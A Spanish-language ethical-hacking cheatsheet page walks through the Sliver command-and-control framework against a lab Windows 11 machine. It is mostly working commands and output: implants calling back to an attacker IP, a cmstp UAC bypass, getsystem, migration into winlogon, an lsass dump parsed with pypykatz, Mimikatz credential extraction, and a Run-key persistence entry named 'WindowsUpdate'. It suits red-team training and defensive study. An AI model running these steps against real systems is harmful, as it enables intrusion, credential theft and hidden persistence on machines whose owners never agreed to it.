
# Sliver

**Sliver** es un Command and Control (C2) de post-explotación desarrollado en Go. Se utiliza para mantener el control en sistemas comprometidos, al estilo de Cobalt Strike, pero **de código abierto y multiplataforma**.

{% embed url="<https://github.com/BishopFox/sliver>" %}

<figure><img src="/files/d74un94aL5GMuFOQB5Ox" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;">¿Qué es Sliver?</mark>

Sliver permite generar payloads (implantas), establecer conexiones C2, y realizar acciones de post-explotación como:

* Escalar privilegios
* Enumerar sistemas
* Mantener persistencia
* Transferir archivos
* Establecer **persistencia** en el host

***

## <mark style="color:purple;">Cómo usar</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**Sliver**</mark> <mark style="color:purple;"></mark><mark style="color:purple;">para mantener acceso en una máquina</mark>

### 1. **Instalación de Sliver en Kali Linux**

```bash
curl -sSL https://sliver.sh/install | sudo bash
```

Esto instala el servidor (`sliver-server`) y el cliente (`sliver-client`).

***

### 2. **Iniciar Sliver**

La primera vez creará certificados para TLS y abrirá una CLI interactiva.

```shell-session
afsh4ck@kali$ sliver
     
Connecting to localhost:31337 ...

 	 ██████  ██▓     ██▓ ██▒   █▓▓█████  ██▀███
	▒██    ▒ ▓██▒    ▓██▒▓██░   █▒▓█   ▀ ▓██ ▒ ██▒
	░ ▓██▄   ▒██░    ▒██▒ ▓██  █▒░▒███   ▓██ ░▄█ ▒
	 ▒   ██▒▒██░    ░██░  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄
	▒██████▒▒░██████▒░██░   ▒▀█░  ░▒████▒░██▓ ▒██▒
	▒ ▒▓▒ ▒ ░░ ▒░▓  ░░▓     ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░
	░ ░▒  ░ ░░ ░ ▒  ░ ▒ ░   ░ ░░   ░ ░  ░  ░▒ ░ ▒░
	░  ░  ░    ░ ░    ▒ ░     ░░     ░     ░░   ░
		 ░      ░  ░ ░        ░     ░  ░   ░

All hackers gain exalted
[*] Server v1.5.43 - e116a5ec3d26e8582348a29cfd251f915ce4a405
[*] Welcome to the sliver shell, please type 'help' for options

sliver >
```

#### Menú de ayuda

```
sliver > help

Commands:
=========
  clear       clear the screen
  exit        exit the shell
  help        use 'help [command]' for command help
  monitor     Monitor threat intel platforms for Sliver implants
  wg-config   Generate a new WireGuard client config
  wg-portfwd  List ports forwarded by the WireGuard tun interface
  wg-socks    List socks servers listening on the WireGuard tun interface

Generic:
========
  aliases           List current aliases
  armory            Automatically download and install extensions/aliases
  background        Background an active session
  beacons           Manage beacons
  builders          List external builders
  canaries          List previously generated canaries
  cursed            Chrome/electron post-exploitation tool kit (∩｀-´)⊃━☆ﾟ.*･｡ﾟ
  dns               Start a DNS listener
  env               List environment variables
  generate          Generate an implant binary
  hosts             Manage the database of hosts
  http              Start an HTTP listener
  https             Start an HTTPS listener
  implants          List implant builds
  jobs              Job control
  licenses          Open source licenses
  loot              Manage the server's loot store
  mtls              Start an mTLS listener
  prelude-operator  Manage connection to Prelude's Operator
  profiles          List existing profiles
  reaction          Manage automatic reactions to events
  regenerate        Regenerate an implant
  sessions          Session management
  settings          Manage client settings
  stage-listener    Start a stager listener
  tasks             Beacon task management
  update            Check for updates
  use               Switch the active session or beacon
  version           Display version information
  websites          Host static content (used with HTTP C2)
  wg                Start a WireGuard listener

Multiplayer:
============
  operators  Manage operators

For even more information, please see our wiki: https://github.com/BishopFox/sliver/wiki
```

#### Wiki

{% embed url="<https://github.com/BishopFox/sliver/wiki>" %}

***

### 3. **Generar un Implant (payload)**

{% hint style="warning" %}
Sustituir la IP por tu `IP pública` en Kali
{% endhint %}

#### Payload para Windows

```bash
sliver > generate --mtls 192.168.1.191:443 --os windows --arch amd64

[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 3m21s
[*] Implant saved to /home/kali/USELESS_CRAVAT.exe
```

#### Payload para Linux

```bash
sliver > generate --mtls 192.168.1.191:443 --os linux --arch amd64

[*] Generating new linux/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 40s
[*] Implant saved to /home/kali/HORRIBLE_DRAGSTER
```

#### Payload para MacOS

```bash
sliver > generate --mtls 192.168.1.191:443 --os mac --arch arm64

[*] Generating new darwin/arm64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 53s
[*] Implant saved to /home/kali/BROAD_SPEAKERPHONE
```

Esto guarda los payloads en:

```
/home/kali
```

#### Ver implants generados

```bash
sliver > implants

 Name                 Implant Type   Template   OS/Arch             Format   Command & Control              Debug 
==================== ============== ========== =============== ============ ============================== =======
 BROAD_SPEAKERPHONE   session        sliver     darwin/arm64    EXECUTABLE   [1] mtls://192.168.1.191:443   false 
 HORRIBLE_DRAGSTER    session        sliver     linux/amd64     EXECUTABLE   [1] mtls://192.168.1.191:443   false 
 USELESS_CRAVAT       session        sliver     windows/amd64   EXECUTABLE   [1] mtls://192.168.1.191:443   false 
```

Sliver crea ejecutables bastante pesados (+15mb) con encriptación para evadir antivirus:

```shell-session
afsh4ck@kali$ du -h USELESS_CRAVAT.exe

15M	USELESS_CRAVAT.exe
```

***

### 4. **Configurar y levantar un listener (job)**

Solamente le indicamos el comando `mtls`:

```bash
sliver > mtls --lport 443

[*] Starting mTLS listener ...
[*] Successfully started job #1
```

#### Ver listeners abiertos

```bash
sliver > jobs

 ID   Name   Protocol   Port   Stage Profile 
==== ====== ========== ====== ===============         
 1    mtls   tcp        443     
```

***

### 5. **Ejecutar el payload en la máquina víctima**

Puedes subirlo al objetivo vía `wget`, `scp`, `curl` o explotar una vulnerabilidad. Puedes consultar la siguiente sección para ver distintos métodos de envío de archivos:

{% content-ref url="/pages/nidKxJlqN0jQ1pHco7Rc" %}
[File Transfers](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/file-transfers.md)
{% endcontent-ref %}

En este ejemplo lo ejecutaremos en una máquina Windows 11 Developer:

{% content-ref url="/pages/Je9uNudbLqx0yR746obF" %}
[Windows 11 Developer](/ethical-hacking-cheatsheet/introduccion/ethical-hacking-cheatsheet/instalacion-del-entorno/maquinas-vulnerables/windows-11-developer.md)
{% endcontent-ref %}

Lo he enviado a la máquina con Proton Drive, y al descargarlo Defender no lo detecta:

<figure><img src="/files/cBST5Iq8IPLmxE1pTr8e" alt=""><figcaption></figcaption></figure>

Pero al ejecutarlo Defender lo detecta, por lo que lo deshabilitaremos:

<figure><img src="/files/57o095cnHeGD161S3xS9" alt=""><figcaption></figcaption></figure>

Abrimos una Powershell como admin y lo ejecutamos:

```powershell
PS C:\Users\afern\Desktop> ls

    Directory: C:\Users\afern\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         6/18/2025   7:15 AM       15724032 USELESS_CRAVAT.exe


PS C:\Users\afern\Desktop> .\USELESS_CRAVAT.exe
```

Una vez ejecutado, si todo va bien, en `sliver` aparecerá una sesión activa con un ID asociado.

```bash
[*] Session 48219de8 USELESS_CRAVAT - 192.168.1.241:50684 (DESKTOP-ECKQUF3) - windows/amd64 - Wed, 18 Jun 2025 16:36:58 CEST

sliver > sessions

 ID         Transport   Remote Address        Hostname          Username   Operating System   Health  
========== =========== ===================== ================= ========== ================== =========
 48219de8   mtls        192.168.1.241:50684   DESKTOP-ECKQUF3   afern      windows/amd64      [ALIVE] 
```

***

### 6. **Interactuar con la sesión**

Con `use` y el ID nos conectamos a la sesión y con `help` mostramos todas las opciones disponibles:

```bash
sliver > use 48219de8

[*] Active session USELESS_CRAVAT (48219de8-1c9c-4ed4-8a83-c1556c26a8d5)

sliver (USELESS_CRAVAT) > help

<---SNIP--->

Sliver - Windows:
=================
  backdoor          Infect a remote file with a sliver shellcode
  dllhijack         Plant a DLL for a hijack scenario
  execute-assembly  Loads and executes a .NET assembly in a child process (Windows Only)
  getprivs          Get current privileges (Windows only)
  getsystem         Spawns a new sliver session as the NT AUTHORITY\SYSTEM user (Windows Only)
  impersonate       Impersonate a logged in user.
  make-token        Create a new Logon Session with the specified credentials
  migrate           Migrate into a remote process
  psexec            Start a sliver service on a remote target
  registry          Windows registry operations
  rev2self          Revert to self: lose stolen Windows token
  runas             Run a new process in the context of the designated user (Windows Only)
  spawndll          Load and execute a Reflective DLL in a remote process

Sliver:
=======
  cat                Dump file to stdout
  cd                 Change directory
  chmod              Change permissions on a file or directory
  chown              Change owner on a file or directory
  chtimes            Change access and modification times on a file (timestomp)
  close              Close an interactive session without killing the remote process
  download           Download a file
  execute            Execute a program on the remote system
  execute-shellcode  Executes the given shellcode in the sliver process
  extensions         Manage extensions
  getgid             Get session process GID
  getpid             Get session pid
  getuid             Get session process UID
  ifconfig           View network interface configurations
  info               Get info about session
  interactive        Task a beacon to open an interactive session (Beacon only)
  kill               Kill a session
  ls                 List current directory
  memfiles           List current memfiles
  mkdir              Make a directory
  msf                Execute an MSF payload in the current process
  msf-inject         Inject an MSF payload into a process
  mv                 Move or rename a file
  netstat            Print network connection information
  ping               Send round trip message to implant (does not use ICMP)
  pivots             List pivots for active session
  portfwd            In-band TCP port forwarding
  procdump           Dump process memory
  ps                 List remote processes
  pwd                Print working directory
  reconfig           Reconfigure the active beacon/session
  rename             Rename the active beacon/session
  rm                 Remove a file or directory
  rportfwd           reverse port forwardings
  screenshot         Take a screenshot
  shell              Start an interactive shell
  shikata-ga-nai     Polymorphic binary shellcode encoder (ノ ゜Д゜)ノ ︵ 仕方がない
  sideload           Load and execute a shared object (shared library/DLL) in a remote process
  socks5             In-band SOCKS5 Proxy
  ssh                Run a SSH command on a remote host
  terminate          Terminate a process on the remote system
  upload             Upload a file
  whoami             Get session user execution context
```

#### Información de usuario y sistema

```bash
liver (USELESS_CRAVAT) > whoami

Logon ID: DESKTOP-ECKQUF3\afern
[*] Current Token ID: DESKTOP-ECKQUF3\afern

sliver (USELESS_CRAVAT) > info

        Session ID: 48219de8-1c9c-4ed4-8a83-c1556c26a8d5
              Name: USELESS_CRAVAT
          Hostname: DESKTOP-ECKQUF3
              UUID: 62db4d56-fa5f-a390-fb01-6c3055f6e425
          Username: DESKTOP-ECKQUF3\afern
               UID: S-1-5-21-4226096133-763015793-1092848644-1001
               GID: S-1-5-21-4226096133-763015793-1092848644-1001
               PID: 5836
                OS: windows
           Version: 10 build 21996 x86_64
            Locale: en-US
              Arch: amd64
         Active C2: mtls://192.168.1.191:443
    Remote Address: 192.168.1.241:50684
         Proxy URL: 
Reconnect Interval: 1m0s
     First Contact: Wed Jun 18 16:36:58 CEST 2025 (27m35s ago)
      Last Checkin: Wed Jun 18 17:04:29 CEST 2025 (4s ago)
```

***

### 7. Instalar armory

Con el comando armory podemos instalar automáticamente multitud de módulos de sliver para realizar funciones avanzadas:

```bash
sliver (USELESS_CRAVAT) > armory

[*] Fetching 1 armory index(es) ... done!

 Packages                                                                                                                                                                                      
 Command Name                    Version   Type        Help                                                                                                                                    
=============================== ========= =========== =========================================================================================================================================
 bof-roast                       v0.0.2    Extension   Beacon Object File repo for roasting Active Directory                                                                                   
 bof-servicemove                 v0.0.1    Extension   Lateral movement technique by abusing Windows Perception Simulation Service to achieve DLL hijacking                                    
 c2tc-addmachineaccount          v0.0.9    Extension   AddMachineAccount [Computername] [Password <Optional>]                                                                                  
 c2tc-askcreds                   v0.0.9    Extension   Collect passwords using CredUIPromptForWindowsCredentialsName                                                                           
 c2tc-domaininfo                 v0.0.9    Extension   enumerate domain information using Active Directory Domain Services                                                                     
 c2tc-kerberoast                 v0.0.9    Extension   A BOF tool to list all SPN enabled user/service accounts or request service tickets (TGS-REP)                                           
 c2tc-kerbhash                   v0.0.9    Extension   port of the Mimikatz/Rubeus hash command                                                                                                
 c2tc-klist                      v0.0.9    Extension   Displays a list of currently cached Kerberos tickets.                                                                                   
 c2tc-lapsdump                   v0.0.9    Extension   Dump LAPS passwords from specified computers within Active Directory                                                                    
 c2tc-petitpotam                 v0.0.9    Extension   PetitPotam <capture server ip or hostname> <target server ip or hostname>                                                               
 c2tc-psc                        v0.0.9    Extension   show detailed information from processes with established TCP and RDP connections                                                       
 c2tc-psk                        v0.0.9    Extension   show detailed information from the windows kernel and loaded driver modules                                                             
 c2tc-psm                        v0.0.9    Extension   show detailed information from a specific process id                                                                                    
 c2tc-psw                        v0.0.9    Extension   Show Window titles from processes with active Windows                                                                                   
 c2tc-psx                        v0.0.9    Extension   show (detailed) information from all processes running on the system                                                                    
 c2tc-smbinfo                    v0.0.9    Extension   Gather remote system version info using the NetWkstaGetInfo API                                                                         
 c2tc-spray-ad                   v0.0.9    Extension   Perform a Kerberos or ldap password spraying attack against Active Directory
 <---SNIP--->
```

***

## <mark style="color:purple;">Attack Path</mark>

Una vez que tenemos una sesión de Sliver abierta vamos a hacer un path de ataque completo:

1. Ejecución
2. Escalada de privilegios
3. Evasión de defensas
4. Acceso a credenciales
5. Discovery
6. Persistencia

***

### 1. Ejecución

El implante Silver C2 se ejecuta en la estación de trabajo como carga útil de etapa 2 y desde el servidor Silver C2 obtenemos una sesión de shell, esta sesión proporciona múltiples métodos para ejecutar comandos y otros scripts o binarios.

#### **Red team - Shell Command**

*La sesión de Sliver C2 cuenta con un intérprete* de comandos integrado para generar un símbolo del sistema de PowerShell. Sin embargo, esto se considera una mala práctica y dejará registros obvios en el sistema objetivo para las detecciones.&#x20;

```bash
sliver (USELESS_CRAVAT) > shell

? This action is bad OPSEC, are you an adult? Yes

[*] Wait approximately 10 seconds after exit, and press <enter> to continue
[*] Opening shell tunnel (EOF to exit) ...

[*] Started remote shell with pid 1776

PS C:\Users\afern\Desktop> whoami
desktop-eckquf3\afern
```

#### **Red team - Execute Command**

El método preferido para ejecutar un programa en el destino es *ejecutar* un comando que también puede capturar la salida.&#x20;

```powershell
sliver (USELESS_CRAVAT) > execute -o ipconfig

[*] Output:

Configuración IP de Windows

Adaptador de Ethernet Ethernet0:

   Sufijo DNS específico para la conexión. . : 
   Dirección IPv6 . . . . . . . . . . : 2a0c:5a80:b203:ff00:d485:9582:da6d:4721
   Dirección IPv6 temporal. . . . . . : 2a0c:5a80:b203:ff00:ad31:6351:2fe6:d062
   Vínculo: dirección IPv6 local. . . : fe80::d485:9582:da6d:4721%5
   Dirección IPv4. . . . . . . . . . . . . . : 192.168.1.241
   Máscara de subred . . . . . . . . . . . . : 255.255.255.0
   Puerta de enlace predeterminada . . . . . : fe80::1%5
                                       192.168.1.1
```

#### Psexec

Sirva para generar un nuevo payload directamente en el objetivo a través de la Shell de Sliver.

Necesitamos conocer el hostname:

```bash
sliver (USELESS_CRAVAT) > shell

? This action is bad OPSEC, are you an adult? Yes

[*] Wait approximately 10 seconds after exit, and press <enter> to continue
[*] Opening shell tunnel (EOF to exit) ...

[*] Started remote shell with pid 7512

PS C:\Users\afern\desktop> hostname
hostname
DESKTOP-ECKQUF3
```

Creamos un nuevo profile:

```bash
sliver (USELESS_CRAVAT) > profiles new --format service --skip-symbols --mtls a.bc.de win-svc64

[*] Saved new implant profile win-svc64
```

Y ejecutamos el psexec:

```
sliver (USELESS_CRAVAT) > psexec -s Sliver -p win-svc64 DESKTOP-ECKQUF3

⚠️  You're going to deploy the following service:
- Name: Sliver
- Description: Sliver implant
⚠️  You might want to change that before going further...
? This action is bad OPSEC, are you an adult? Yes

[*] No builds found for profile win-svc64, generating a new one
[*] Sliver name for profile win-svc64: ITCHY_FAIRY
[*] Uploaded service binary to \\DESKTOP-ECKQUF3\C$\windows\temp\yr__mt.exe
[*] Waiting a bit for the file to be analyzed ...
[*] Successfully started service on DESKTOP-ECKQUF3 (c:\windows\temp\yr__mt.exe)
[*] Successfully removed service Sliver on DESKTOP-ECKQUF3
```

***

### 2. Escalada de privilegios

Obtenemos acceso a una estación de trabajo con una cuenta del grupo local "administradores". Sin embargo, necesitamos elevar el proceso a *NT Authority/System* , lo que nos permite realizar acciones con altos privilegios, como volcados de memoria de procesos.

#### **Omisión de UAC en Windows modernos**

La omisión del Control de Cuentas de Usuario puede realizarse mediante diversas técnicas. Para ello, utilizamos *`cmstp.exe`* , un binario del sistema de Windows. Los detalles y el código fuente del exploit están disponibles [aquí](https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html) .

Seguimos los pasos del artículo y creamos el archivo `Source.cs` en el objetivo Windows y lo compilamos en la misma ruta donde esté el archivo con el siguiente comando de Powershell:&#x20;

```powershell
Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\Source.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "CMSTP-UAC-Bypass.dll"
```

Luego usaremos el siguiente script de Powershell (cambiando la ruta y nombre del payload de Sliver):

```powershell
[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\CMSTP_UAC-Bypass.dll"))
[CMSTPBypass]::Execute("C:\Users\afern\Desktop\USELESS_CRAVAT.exe")
```

Cargamos los archivos en la máquina víctima y ejecutamos el script de PowerShell con `execute` para devolver una nueva sesión con omisión de UAC.

```powershell
sliver (USELESS_CRAVAT) > execute -o powershell -Command "[Reflection.Assembly]::Load([IO.File]::ReadAllBytes('C:\Users\afern\Desktop\CMSTP-UAC-Bypass.dll')); [CMSTPBypass]::Execute('C:\Users\afern\Desktop\USELESS_CRAVAT.exe')"

 ⠋  Executing powershell -Command [Reflection.Assembly]::Load([IO.File]::ReadAllBytes('C:\Users\afern\Desktop\CMSTP-UAC-Bypass.dll')); [CMSTPBypass]::Execute('C:\Users ⠙  Executing powershell -Command [Reflection.Assembly]::Load([IO.File]::ReadAllBytes('C:\Users\afern\Desktop\CMSTP-UAC-Bypass.dll')); [CMSTPBypass]::Execute('C:\Users ⠹  Executing powershell -Command [Reflection.Assembly]::Load([IO.File]::ReadAllBytes('C:\Users\afern\Desktop\CMSTP-UAC-Bypass.dll')); [CMSTPBypass]::Execute('C:\Users ⠸  Executing powershell -Command [Reflection.Assembly]::Load([IO.File]::ReadAllBytes('C:\Users\afern\Desktop\CMSTP-UAC-Bypass.dll')); [CMSTPBypass]::Execute('C:\Users[*] Output:

GAC    Version        Location                                                                                         
---    -------        --------                                                                                         
False  v4.0.30319                                                                                                      
Payload file written to C:\windows\temp\z1m1uwab.inf
True
```

#### Get System

Después de omitir UAC, podemos usar el comando `getsystem` integrado para generar una nueva sesión de Sliver como usuario NT AUTHORITY\SYSTEM.

```bash
sliver (USELESS_CRAVAT) > whoami

Logon ID: DESKTOP-ECKQUF3\afern
[*] Current Token ID: DESKTOP-ECKQUF3\afern
```

```bash
sliver (USELESS_CRAVAT) > getsystem

[*] A new SYSTEM session should pop soon...

[*] Session 90665e96 USELESS_CRAVAT - 192.168.1.241:49900 (DESKTOP-ECKQUF3) - windows/amd64 - Wed, 18 Jun 2025 17:54:00 CEST

sliver (USELESS_CRAVAT) > sessions

 ID         Transport   Remote Address        Hostname          Username              Operating System   Health  
========== =========== ===================== ================= ===================== ================== =========
 90665e96   mtls        192.168.1.241:49900   DESKTOP-ECKQUF3   NT AUTHORITY\SYSTEM   windows/amd64      [ALIVE] 
 bc17071f   mtls        192.168.1.241:49887   DESKTOP-ECKQUF3   afern                 windows/amd64      [ALIVE] 

sliver (USELESS_CRAVAT) > use 90665e96

[*] Active session USELESS_CRAVAT (90665e96-b78c-4549-aef0-ee4663bfa381)
```

```bash
sliver (USELESS_CRAVAT) > whoami

Logon ID: NT AUTHORITY\SYSTEM
[*] Current Token ID: NT AUTHORITY\SYSTEM
```

***

### 3. Evasión de defensas

#### Ver procesos en ejecución

```bash
sliver (USELESS_CRAVAT) > ps

 Pid     Ppid   Owner                          Arch     Executable                      Session 
======= ====== ============================== ======== =============================== =========
 0       0                                              [System Process]                -1      
 4       0                                     x86_64   System                          0       
 100     4                                     x86_64   Registry                        0       
 332     4                                     x86_64   smss.exe                        0       
 456     444                                            csrss.exe                       -1      
 524     516                                            csrss.exe                       -1      
 532     444                                   x86_64   wininit.exe                     0       
 588     516    NT AUTHORITY\SYSTEM            x86_64   winlogon.exe                    1       
 672     532    NT AUTHORITY\SYSTEM            x86_64   lsass.exe                       0  
 <---SNIP--->
```

Nos interesa el PID vinculado a winlogon, que se ejecuta como SYSTEM y se arranca con el inicio de Windows.

#### Migrar proceso

```bash
sliver (USELESS_CRAVAT) > migrate --pid 588

[*] Successfully migrated to 588

[*] Session 63c30ecc USELESS_CRAVAT - 192.168.1.241:49906 (DESKTOP-ECKQUF3) - windows/amd64 - Wed, 18 Jun 2025 18:03:44 CEST
```

```bash
sliver (USELESS_CRAVAT) > sessions

 ID         Transport   Remote Address        Hostname          Username              Operating System   Health  
========== =========== ===================== ================= ===================== ================== =========
 63c30ecc   mtls        192.168.1.241:49906   DESKTOP-ECKQUF3   NT AUTHORITY\SYSTEM   windows/amd64      [ALIVE] 
 bc17071f   mtls        192.168.1.241:49887   DESKTOP-ECKQUF3   afern                 windows/amd64      [ALIVE] 
 90665e96   mtls        192.168.1.241:49900   DESKTOP-ECKQUF3   NT AUTHORITY\SYSTEM   windows/amd64      [ALIVE] 

sliver (USELESS_CRAVAT) > use 63c30ecc

[*] Active session USELESS_CRAVAT (63c30ecc-7c23-4afb-a55d-f8da847e74b5)

sliver (USELESS_CRAVAT) > whoami

Logon ID: NT AUTHORITY\SYSTEM
[*] Current Token ID: NT AUTHORITY\SYSTEM
```

***

### 4. Acceso a credenciales

*Con los privilegios obtenidos, utilizamos el comando procdump* incorporado para volcar la memoria del proceso “lsass.exe” y recuperar las credenciales sin conexión en Sliver C2.&#x20;

```bash
sliver (USELESS_CRAVAT) > procdump --pid 672 --save /home/kali/lsass.dump

[*] Process dump stored in: /home/kali/lsass.dump
```

#### Extracción con  Pypykatz en Kali

Podemos obtener la contraseña de un usuario conectado.

```shell-session
afsh4ck@kali$ pypykatz lsa minidump lsass.dump

INFO:pypykatz:Parsing file lsass.dump
FILE: ======== lsass.dump =======
== LogonSession ==
authentication_id 5102970 (4ddd7a)
session_id 2
username afern
domainname DESKTOP-ECKQUF3
logon_server 
logon_time 2025-06-18T16:06:51.548611+00:00
sid S-1-5-21-4226096133-763015793-1092848644-1001
luid 5102970
	== MSV ==
		Username: afernandez@hotmail.com
		Domain: MicrosoftAccount
		LM: NA
		NT: 446488e237900324b839a544heyr9y64
		SHA1: 0000000000000000000000000000000000000000
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [4ddd7a]==
		username afernandez@hotmail.com
		domainname MicrosoftAccount
		password None
		password (hex)
	== Kerberos ==
		Username: afernandez@hotmail.com
		Domain: MicrosoftAccount
	== WDIGEST [4ddd7a]==
		username afernandez@hotmail.com
		domainname MicrosoftAccount
		password None
		password (hex)
```

#### Mimikatz

Podemos cargar fácilmente Mimikatz desde Kali:

```powershell
sliver (USELESS_CRAVAT) > upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe

[*] Wrote file to C:\Windows\Temp\mimikatz.exe
```

Después podemos cambiar a una shell y ejecutarlo:

```
sliver (USELESS_CRAVAT) > shell

? This action is bad OPSEC, are you an adult? Yes

[*] Wait approximately 10 seconds after exit, and press <enter> to continue
[*] Opening shell tunnel (EOF to exit) ...

[*] Started remote shell with pid 6536

PS C:\Windows\Temp> ./mimikatz.exe
./mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
  
mimikatz #
```

```
mimikatz # token::elevate
Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM

620	{0;000003e7} 1 D 42485     	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Primary
 -> Impersonated !
 * Process Token : {0;000003e7} 0 D 2668055   	NT AUTHORITY\SYSTEM	S-1-5-18	(11g,05p)	Primary
 * Thread Token  : {0;000003e7} 1 D 2735008   	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Impersonation (Delegation)

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 297254 (00000000:00048926)
Session           : Interactive from 1
User Name         : afern
Domain            : DESKTOP-ECKQUF3
Logon Server      : (null)
Logon Time        : 6/18/2025 9:48:21 AM
SID               : S-1-5-21-4226096133-763015793-1092848644-1001
```

***

### 5. Discovery

En esta etapa utilizamos Sliver C2 para obtener información acerca del usuario y del sistema.

#### System info

```bash
sliver (USELESS_CRAVAT) > info

        Session ID: 90665e96-b78c-4549-aef0-ee4663bfa381
              Name: USELESS_CRAVAT
          Hostname: DESKTOP-ECKQUF3
              UUID: 62db4d56-fa5f-a390-fb01-6c3055f6e425
          Username: NT AUTHORITY\SYSTEM
               UID: S-1-5-18
               GID: S-1-5-18
               PID: 8088
                OS: windows
           Version: 10 build 21996 x86_64
            Locale: en-US
              Arch: amd64
         Active C2: mtls://192.168.1.191:443
    Remote Address: 192.168.1.241:49966
         Proxy URL: 
Reconnect Interval: 1m0s
     First Contact: Wed Jun 18 18:16:03 CEST 2025 (15m10s ago)
      Last Checkin: Wed Jun 18 18:29:52 CEST 2025 (1m21s ago)
```

#### Privilegios del usuario actual

```
sliver (USELESS_CRAVAT) > getprivs

Privilege Information for winlogon.exe (PID: 8088)
--------------------------------------------------

Process Integrity Level: High

Name                            	Description                                   	Attributes
====                            	===========                                   	==========
SeAssignPrimaryTokenPrivilege   	Replace a process level token                 	Disabled
SeIncreaseQuotaPrivilege        	Adjust memory quotas for a process            	Disabled
SeTcbPrivilege                  	Act as part of the operating system           	Enabled, Enabled by Default
SeSecurityPrivilege             	Manage auditing and security log              	Disabled
SeTakeOwnershipPrivilege        	Take ownership of files or other objects      	Disabled
SeLoadDriverPrivilege           	Load and unload device drivers                	Disabled
SeProfileSingleProcessPrivilege 	Profile single process                        	Enabled, Enabled by Default
SeIncreaseBasePriorityPrivilege 	Increase scheduling priority                  	Enabled, Enabled by Default
SeCreatePermanentPrivilege      	Create permanent shared objects               	Enabled, Enabled by Default
SeBackupPrivilege               	Back up files and directories                 	Disabled
SeRestorePrivilege              	Restore files and directories                 	Disabled
SeShutdownPrivilege             	Shut down the system                          	Disabled
SeDebugPrivilege                	Debug programs                                	Enabled, Enabled by Default
SeAuditPrivilege                	Generate security audits                      	Enabled, Enabled by Default
SeSystemEnvironmentPrivilege    	Modify firmware environment values            	Disabled
SeChangeNotifyPrivilege         	Bypass traverse checking                      	Enabled, Enabled by Default
SeUndockPrivilege               	Remove computer from docking station          	Disabled
SeManageVolumePrivilege         	Perform volume maintenance tasks              	Disabled
SeImpersonatePrivilege          	Impersonate a client after authentication     	Enabled, Enabled by Default
SeCreateGlobalPrivilege         	Create global objects                         	Enabled, Enabled by Default
SeTrustedCredManAccessPrivilege 	Access Credential Manager as a trusted caller 	Disabled
```

#### Netstat

```
sliver (USELESS_CRAVAT) > netstat

 Protocol   Local Address         Foreign Address                   State         PID/Program Name        
========== ===================== ================================= ============= =========================
 tcp        192.168.1.241:49789   192.168.1.191:443                 ESTABLISHED   9648/USELESS_CRAVAT.exe 
 tcp        192.168.1.241:49792   52.236.29.249:443                 CLOSE_WAIT    4800/SystemSettings.exe 
 tcp        192.168.1.241:49794   192.168.1.191:443                 ESTABLISHED   2512/spoolsv.exe        
 tcp        192.168.1.241:49798   192.168.1.191:443                 ESTABLISHED   620/winlogon.exe 
```

***

### 6. Persistencia

#### Crear registro

```bash
sliver (USELESS_CRAVAT) > execute -o cmd -Command "reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdate /t REG_SZ /d \"C:\Users\afern\Desktop\USELESS_CRAVAT.exe\" /f"

[*] Output:
Microsoft Windows [Version 10.0.21996.1]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\Temp>
```

Esto asegura que el payload se ejecute en cada reinicio.
